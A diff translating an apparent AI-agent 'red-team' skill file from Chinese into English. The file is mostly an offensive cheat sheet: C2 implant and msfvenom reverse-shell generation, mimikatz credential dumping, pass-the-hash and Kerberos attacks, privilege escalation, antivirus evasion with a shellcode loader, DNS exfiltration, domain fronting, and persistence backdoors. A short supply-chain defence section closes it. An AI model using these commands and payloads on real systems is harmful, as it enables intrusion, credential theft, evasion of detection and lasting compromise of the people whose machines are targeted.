@@ -1,28 +1,28 @@
 ---
 name: red-team
-description: 红队攻击技术。PoC开发、C2框架、横向移动、权限提升、免杀技术。当用户提到红队、PoC、C2、横向移动、PTH、免杀、Cobalt Strike、Sliver、提权时使用。
+description: Red team attack techniques. PoC development, C2 frameworks, lateral movement, privilege escalation, evasion techniques. Use when the user mentions red team, PoC, C2, lateral movement, PTH, evasion, Cobalt Strike, Sliver, or privilege escalation.
 ---
 
-# 🔥 赤焰秘典 · 红队攻击 (Red Team)
+# 🔥 Scarlet Tome · Red Team (Red Team)
 
 
-## 攻击链 (Kill Chain)
+## Kill Chain
 
 ```
-侦察 → 武器化 → 投递 → 利用 → 安装 → C2 → 行动
-  │        │       │      │       │      │      │
-  └─ OSINT ─┴─ PoC ─┴─ 钓鱼 ─┴─ 提权 ─┴─ 持久 ─┴─ 横向
+Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions
+      │               │             │             │              │         │        │
+      └─ OSINT ───────┴─ PoC ───────┴─ Phishing ──┴─ PrivEsc ────┴─ Persist┴─ Lateral
 ```
 
-## PoC 开发
+## PoC Development
 
-### 标准 PoC 结构
+### Standard PoC Structure
 ```python
 #!/usr/bin/env python3
 """
-漏洞名称: CVE-XXXX-XXXX
-影响版本: x.x.x - x.x.x
-漏洞类型: RCE/SQLi/XSS/SSRF
+Vulnerability Name: CVE-XXXX-XXXX
+Affected Versions: x.x.x - x.x.x
+Vulnerability Type: RCE/SQLi/XSS/SSRF
 """
 import requests
 import argparse
@@ -36,15 +36,15 @@ class POC:
         }
 
     def check(self) -> bool:
-        """无害检测"""
+        """Harmless detection"""
         try:
-            # 使用延时、DNS外带等无害方式验证
+            # Verify using harmless methods like delays, DNS out-of-band, etc.
             pass
         except Exception as e:
             return False
 
     def exploit(self, cmd: str) -> str:
-        """漏洞利用"""
+        """Vulnerability exploitation"""
         pass
 
 def main():
@@ -64,22 +64,22 @@ if __name__ == '__main__':
     main()
 ```
 
-## C2 框架
+## C2 Frameworks
 
-### Sliver (推荐开源)
+### Sliver (Recommended Open-source)
 ```bash
-# 安装
+# Install
 curl https://sliver.sh/install | sudo bash
 
-# 生成 Implant
+# Generate Implant
 sliver > generate --mtls 192.168.1.100 --os windows --save implant.exe
 sliver > generate --http 192.168.1.100 --os linux --save implant
 
-# 启动监听
+# Start Listener
 sliver > mtls --lhost 0.0.0.0 --lport 8888
 sliver > http --lhost 0.0.0.0 --lport 80
 
-# 会话操作
+# Session Operations
 sliver > sessions
 sliver > use SESSION_ID
 sliver (SESSION) > shell
@@ -89,10 +89,10 @@ sliver (SESSION) > upload local remote
 
 ### Metasploit
 ```bash
-# 生成 Payload
+# Generate Payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
 
-# 监听
+# Listen
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/x64/meterpreter/reverse_tcp
 msf6 > set LHOST 0.0.0.0
@@ -105,7 +105,7 @@ meterpreter > load kiwi
 meterpreter > creds_all
 ```
 
-### 简易 HTTP C2
+### Simple HTTP C2
 ```python
 # Server
 from flask import Flask, request, jsonify
@@ -127,7 +127,7 @@ def result(agent_id):
     return jsonify({"status": "ok"})
 ```
 
-## 横向移动
+## Lateral Movement
 
 ### Pass-the-Hash (PTH)
 ```bash
@@ -146,17 +146,17 @@ sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
 
 ### Pass-the-Ticket (PTT)
 ```bash
-# 导出票据
+# Export Tickets
 mimikatz # sekurlsa::tickets /export
 
-# 注入票据
+# Inject Ticket
 mimikatz # kerberos::ptt ticket.kirbi
 
 # Rubeus
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
-### Kerberos 攻击
+### Kerberos Attacks
 ```bash
 # Kerberoasting
 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
@@ -168,7 +168,7 @@ GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP
 mimikatz # kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
 ```
 
-### 远程执行方法
+### Remote Execution Methods
 ```bash
 # WinRM
 evil-winrm -i TARGET -u user -H HASH
@@ -181,74 +181,74 @@ Invoke-Command -ComputerName TARGET -ScriptBlock {whoami}
 wmic /node:TARGET /user:admin /password:pass process call create "cmd.exe /c whoami"
 ```
 
-## 权限提升
+## Privilege Escalation
 
-### Windows 提权
+### Windows Privilege Escalation
 ```powershell
-# 信息收集
+# Information Gathering
 whoami /priv
 systeminfo
 net user
 net localgroup administrators
 
-# 常见提权路径
-- SeImpersonatePrivilege → Potato系列
-- 服务配置错误 → 服务路径劫持
-- 计划任务 → 任务劫持
-- AlwaysInstallElevated → MSI提权
-- 未打补丁 → 内核漏洞
+# Common Privilege Escalation Paths
+- SeImpersonatePrivilege → Potato series
+- Service misconfiguration → Service path hijacking
+- Scheduled tasks → Task hijacking
+- AlwaysInstallElevated → MSI privilege escalation
+- Unpatched → Kernel vulnerabilities
 
-# Potato 提权
+# Potato Privilege Escalation
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
 PrintSpoofer.exe -i -c cmd
 GodPotato.exe -cmd "cmd /c whoami"
 ```
 
-### Linux 提权
+### Linux Privilege Escalation
 ```bash
-# 信息收集
+# Information Gathering
 id
 uname -a
 cat /etc/passwd
 sudo -l
 find / -perm -4000 2>/dev/null
 
-# 常见提权路径
-- SUID 二进制 → GTFOBins
-- sudo 配置错误 → sudo提权
-- 内核漏洞 → DirtyPipe/DirtyCow
-- 定时任务 → cron劫持
-- 容器逃逸 → Docker/K8s
+# Common Privilege Escalation Paths
+- SUID binaries → GTFOBins
+- sudo misconfiguration → sudo privilege escalation
+- Kernel vulnerabilities → DirtyPipe/DirtyCow
+- Cron jobs → cron hijacking
+- Container escapes → Docker/K8s
 
-# SUID 利用
+# SUID Exploitation
 find / -perm -4000 2>/dev/null
-# 查 GTFOBins: https://gtfobins.github.io/
+# Check GTFOBins: https://gtfobins.github.io/
 ```
 
-## 免杀技术
+## Evasion Techniques
 
-### 基础免杀
+### Basic Evasion
 ```python
-# 1. 字符串混淆
+# 1. String Obfuscation
 import base64
 payload = base64.b64encode(b"malicious_code").decode()
 exec(base64.b64decode(payload))
 
-# 2. 动态加载
+# 2. Dynamic Loading
 import importlib
 module = importlib.import_module("os")
 getattr(module, "system")("whoami")
 
-# 3. 加密 Payload
+# 3. Encrypted Payload
 from Crypto.Cipher import AES
-# 运行时解密执行
+# Decrypt and execute at runtime
 ```
 
-### Shellcode 加载
+### Shellcode Loading
 ```python
 import ctypes
 
-shellcode = b"\xfc\x48\x83..."  # msfvenom 生成
+shellcode = b"\xfc\x48\x83..."  # Generated by msfvenom
 
 # Windows
 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
@@ -257,35 +257,35 @@ ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
 ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
 ```
 
-### 隐蔽通信
+### Covert Communication
 ```python
-# DNS 隧道
+# DNS Tunneling
 def dns_exfil(data, domain):
     encoded = base64.b32encode(data.encode()).decode()
     for chunk in [encoded[i:i+63] for i in range(0, len(encoded), 63)]:
         dns.resolver.resolve(f"{chunk}.{domain}", 'A')
 
-# 域前置
+# Domain Fronting
 def domain_fronting(real_host, cdn_domain, data):
     headers = {"Host": real_host}
     requests.post(f"https://{cdn_domain}/api", json=data, headers=headers)
 ```
 
-## 持久化
+## Persistence
 
 ### Windows
 ```powershell
-# 注册表
+# Registry
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe"
 
-# 计划任务
+# Scheduled Tasks
 schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon
 
-# 服务
+# Services
 sc create backdoor binPath= "C:\backdoor.exe" start= auto
 
-# WMI 事件订阅
-# 进程启动时触发
+# WMI Event Subscriptions
+# Triggered on process start
 ```
 
 ### Linux
@@ -293,60 +293,60 @@ sc create backdoor binPath= "C:\backdoor.exe" start= auto
 # Crontab
 echo "* * * * * /tmp/backdoor" >> /var/spool/cron/root
 
-# SSH 密钥
+# SSH Keys
 echo "ssh-rsa AAAA..." >> /home/thangtn/.ssh/authorized_keys
 
-# 服务
-# 创建 systemd service
+# Services
+# Create systemd service
 
 # LD_PRELOAD
 echo "/tmp/evil.so" >> /etc/ld.so.preload
 ```
 
-## 工具清单
+## Tool Checklist
 
-| 工具 | 用途 |
-|------|------|
-| Sliver | 开源 C2 框架 |
-| Metasploit | 渗透测试框架 |
-| Cobalt Strike | 商业 C2 |
-| Impacket | Windows 协议工具 |
-| CrackMapExec | 批量横向 |
-| Mimikatz | 凭证提取 |
-| Rubeus | Kerberos 工具 |
-| BloodHound | AD 路径分析 |
+| Tool | Purpose |
+|------|---------|
+| Sliver | Open-source C2 Framework |
+| Metasploit | Penetration Testing Framework |
+| Cobalt Strike | Commercial C2 |
+| Impacket | Windows Protocol Tools |
+| CrackMapExec | Batch Lateral Movement |
+| Mimikatz | Credential Extraction |
+| Rubeus | Kerberos Tools |
+| BloodHound | AD Path Analysis |
 
-## 供应链安全
+## Supply Chain Security
 
-### 供应链攻击向量
+### Supply Chain Attack Vectors
 ```
-源代码 → 构建 → 制品 → 分发 → 部署 → 运行
-   │       │      │      │      │      │
-   投毒    篡改   后门   劫持   提权   横向
+Source Code → Build → Artifact → Distribution → Deployment → Runtime
+     │          │        │            │             │           │
+ Poisoning   Tampering Backdoor    Hijacking     PrivEsc     Lateral
 ```
 
-| 阶段 | 攻击方式 | 示例 |
-|------|----------|------|
-| 源代码 | 依赖投毒 | event-stream、ua-parser-js |
-| 构建 | CI/CD 劫持 | SolarWinds、CodeCov |
-| 制品 | 恶意包 | PyPI/npm 钓鱼包 |
-| 部署 | 配置篡改 | K8s YAML 注入 |
-| 运行 | 容器逃逸 | 特权容器、内核漏洞 |
+| Phase | Attack Method | Example |
+|-------|---------------|---------|
+| Source Code | Dependency poisoning | event-stream, ua-parser-js |
+| Build | CI/CD hijacking | SolarWinds, CodeCov |
+| Artifact | Malicious packages | PyPI/npm typosquatting |
+| Deployment | Configuration tampering | K8s YAML injection |
+| Runtime | Container escapes | Privileged containers, kernel vulnerabilities |
 
-### SBOM + 依赖扫描
+### SBOM + Dependency Scanning
 ```bash
-# SBOM 生成 (Syft)
+# Generate SBOM (Syft)
 syft nginx:latest -o cyclonedx-json > sbom.json
 
-# 漏洞扫描 (Trivy)
+# Vulnerability Scanning (Trivy)
 trivy image --severity HIGH,CRITICAL nginx:latest
 trivy fs --scanners vuln,secret,misconfig .
 
-# 依赖扫描 (Grype)
+# Dependency Scanning (Grype)
 grype sbom:./sbom.json
 ```
 
-### 签名验证 (Sigstore/Cosign)
+### Signature Verification (Sigstore/Cosign)
 ```bash
 cosign sign --key cosign.key myregistry/myapp:v1.0
 cosign verify --key cosign.pub myregistry/myapp:v1.0
@@ -354,21 +354,20 @@ cosign attach sbom --sbom sbom.json myregistry/myapp:v1.0
 cosign verify-attestation --key cosign.pub myregistry/myapp:v1.0
 ```
 
-### SLSA 等级
+### SLSA Levels
 ```
-Level 1: 文档化构建  Level 2: 防篡改+签名来源
-Level 3: 安全平台+隔离构建  Level 4: 双方审查+密封构建
+Level 1: Documented build  Level 2: Tamper-proof + Authenticated source
+Level 3: Security platform + Isolated build  Level 4: Two-party review + Hermetic build
 ```
 
-### 供应链安全检查清单
+### Supply Chain Security Checklist
 ```yaml
-源代码:
-  - [ ] 分支保护 + 代码审查 + 依赖锁定 + 密钥泄露扫描
-构建与制品:
-  - [ ] 托管CI/CD + 隔离构建 + 生成SBOM + 签名制品 + 漏洞扫描
-部署与运行:
-  - [ ] 验证签名(Cosign/SLSA) + 准入控制(Kyverno/OPA) + 运行时监控
+Source Code:
+  - [ ] Branch protection + Code review + Dependency lock + Secret leak scanning
+Build and Artifacts:
+  - [ ] Hosted CI/CD + Isolated builds + SBOM generation + Artifact signing + Vulnerability scanning
+Deployment and Runtime:
+  - [ ] Verify signatures (Cosign/SLSA) + Admission control (Kyverno/OPA) + Runtime monitoring
 ```
 
 ---
-
